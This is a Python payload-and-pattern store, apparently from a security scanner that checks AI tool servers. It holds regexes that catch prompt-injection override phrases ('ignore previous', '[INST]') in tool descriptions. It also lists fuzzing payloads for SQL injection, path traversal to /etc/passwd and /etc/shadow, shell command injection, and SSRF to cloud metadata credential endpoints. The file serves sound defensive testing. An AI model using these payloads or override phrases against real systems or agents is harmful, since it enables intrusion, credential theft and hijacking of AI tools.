"""Хранилище паттернов и вредоносных payloads (PayloadStore).

Содержит наборы вредоносных payloads для различных типов инъекций,
словари ключевых слов для анализа описаний и шаблоны проверок.
"""

from __future__ import annotations

# === Паттерны для обнаружения скрытых инструкций в описаниях (CF-01) ===

POISONING_KEYWORDS: list[str] = [
    "ignore",
    "always",
    "never",
    "do not tell",
    "don't tell",
    "before calling",
    "after calling",
    "also read",
    "also send",
    "also access",
    "also call",
    "also execute",
    "ignore previous",
    "ignore above",
    "disregard",
    "override",
    "instead of",
    "secretly",
    "hidden",
    "do not mention",
    "don't mention",
    "without telling",
    "without informing",
    "bypass",
    "skip verification",
    "skip validation",
    "no need to ask",
    "automatically",
    "silently",
]

POISONING_REGEX_PATTERNS: list[str] = [
    r"(?i)\b(ignore|disregard|override)\s+(previous|above|prior|all)\b",
    r"(?i)\bdo\s+not\s+(tell|inform|mention|show|reveal)\b",
    r"(?i)\bdon'?t\s+(tell|inform|mention|show|reveal)\b",
    r"(?i)\b(always|never|must)\s+(call|use|invoke|send|read|access)\b",
    r"(?i)\bbefore\s+(calling|using|invoking)\s+this\b",
    r"(?i)\balso\s+(read|send|call|access|execute|fetch|retrieve)\b",
    r"(?i)\b(secret|hidden|covert|stealth)\b",
    r"(?i)\bwithout\s+(telling|informing|notifying|asking)\b",
    r"(?i)\b(bypass|skip|circumvent)\s+(verification|validation|auth|check)\b",
    r"(?i)<\s*(system|instruction|prompt)[^>]*>",
    r"(?i)\[INST\]|\[\/INST\]|\[SYSTEM\]",
]

# Паттерны обфускации (unicode escapes, base64, невидимые символы)
OBFUSCATION_PATTERNS: list[str] = [
    r"\\u[0-9a-fA-F]{4}",                        # unicode escapes
    r"\\x[0-9a-fA-F]{2}",                        # hex escapes
    r"[A-Za-z0-9+/]{20,}={0,2}",                 # base64 (длинные блоки)
    r"[\u200b\u200c\u200d\u2060\ufeff]",          # zero-width символы
    r"[\u0000-\u001f\u007f-\u009f]",              # управляющие символы (кроме tab/newline)
]

# === SQL-инъекции (IM-01) ===

SQL_INJECTION_PAYLOADS: list[str] = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, NULL, NULL --",
    "1' AND 1=1 --",
    "1; SELECT * FROM information_schema.tables --",
    "' OR 1=1 --",
    "admin'--",
    "1' ORDER BY 1 --",
    "' UNION SELECT username, password FROM users --",
    "'; WAITFOR DELAY '0:0:5' --",
]

# === Path Traversal (IM-01) ===

PATH_TRAVERSAL_PAYLOADS: list[str] = [
    "../../etc/passwd",
    "../../../etc/shadow",
    "..\\..\\windows\\system32\\config\\sam",
    "....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "../../proc/self/environ",
    "../../../var/log/syslog",
]

# === Command Injection (IM-01) ===

COMMAND_INJECTION_PAYLOADS: list[str] = [
    "; cat /etc/passwd",
    "| whoami",
    "` id `",
    "$( id )",
    "; ls -la /",
    "& dir C:\\",
    "| cat /etc/shadow",
    "; echo VULNERABLE",
    "$(echo VULNERABLE)",
    "`echo VULNERABLE`",
    "\nid\n",
    "'; echo VULNERABLE; '",
]

# === SSRF (IM-01) ===

SSRF_PAYLOADS: list[str] = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://localhost:6379/",
    "http://127.0.0.1:3306/",
    "http://[::1]:80/",
    "http://0x7f000001/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://localhost:8080/admin",
    "file:///etc/passwd",
    "gopher://127.0.0.1:25/",
]

# === Type confusion (IM-01) ===

TYPE_CONFUSION_PAYLOADS: dict[str, list] = {
    "string_as_number": ["abc", "", "null", "undefined", "NaN", "Infinity", "-Infinity"],
    "overflow": [2**31, -(2**31) - 1, 2**63, 10**20, -10**20],
    "empty": ["", None, [], {}, 0],
    "special_strings": [
        "null", "undefined", "NaN", "true", "false",
        "\x00", "\n\r", "\t\t\t",
        "a" * 10000,  # переполнение длины
    ],
}

# === Паттерны утечки информации (IM-02) ===

INFO_LEAK_PATTERNS: list[str] = [
    r"Traceback \(most recent call last\)",           # Python traceback
    r"at \w+\.\w+\([\w/\\]+\.(?:java|py|js|ts):\d+", # Stack trace
    r"(?:\/[\w.-]+){3,}",                              # Абсолютные пути Unix
    r"[A-Z]:\\(?:[\w.-]+\\){2,}",                       # Абсолютные пути Windows
    r"(?:mysql|postgres|mongodb|redis)://[\w:@]+",     # Строки подключения к БД
    r"(?:password|passwd|pwd|secret|token|key|api_key)\s*[=:]\s*\S+",  # Учётные данные
    r"(?:Version|version)[\s:]+\d+\.\d+",              # Версии ПО
    r"(?:Django|Flask|Express|Spring|Rails)\s*[\d.]",  # Фреймворки и версии
    r"SQLSTATE\[\w+\]",                                 # SQL ошибки
    r"(?:Internal Server Error|500 Error)",            # Ошибки сервера
    r"DEBUG|TRACE|WARN.*Exception",                    # Уровни логирования
]

# === Индикаторы избыточных привилегий (CF-02) ===

EXCESSIVE_PERMISSION_INDICATORS: list[str] = [
    "execute_command",
    "run_command",
    "shell",
    "exec",
    "system",
    "eval",
    "run_code",
    "delete",
    "remove",
    "drop",
    "truncate",
    "format",
    "rm -rf",
    "write_file",
    "modify_file",
    "overwrite",
    "admin",
    "root",
    "sudo",
    "superuser",
]

# === Слова-маркеры для анализа consent (CF-04) ===

MISLEADING_DESCRIPTIONS: list[str] = [
    "safe",
    "harmless",
    "read-only",
    "read only",
    "just reading",
    "only reads",
    "no side effects",
    "non-destructive",
]

# === Паттерны для анализа учётных данных (TR-03) ===

CREDENTIAL_PATTERNS: list[str] = [
    r"(?i)(?:api[_-]?key|apikey)\s*[=:]\s*['\"]?\w{16,}",
    r"(?i)(?:secret|token|password|passwd)\s*[=:]\s*['\"]?\S{8,}",
    r"(?i)(?:AWS_ACCESS_KEY|AWS_SECRET)\s*[=:]\s*\S+",
    r"(?i)(?:OPENAI_API_KEY|ANTHROPIC_API_KEY)\s*[=:]\s*\S+",
    r"(?i)sk-[a-zA-Z0-9]{20,}",       # OpenAI key pattern
    r"(?i)ghp_[a-zA-Z0-9]{36}",        # GitHub PAT
    r"(?i)glpat-[a-zA-Z0-9\-]{20,}",   # GitLab PAT
]
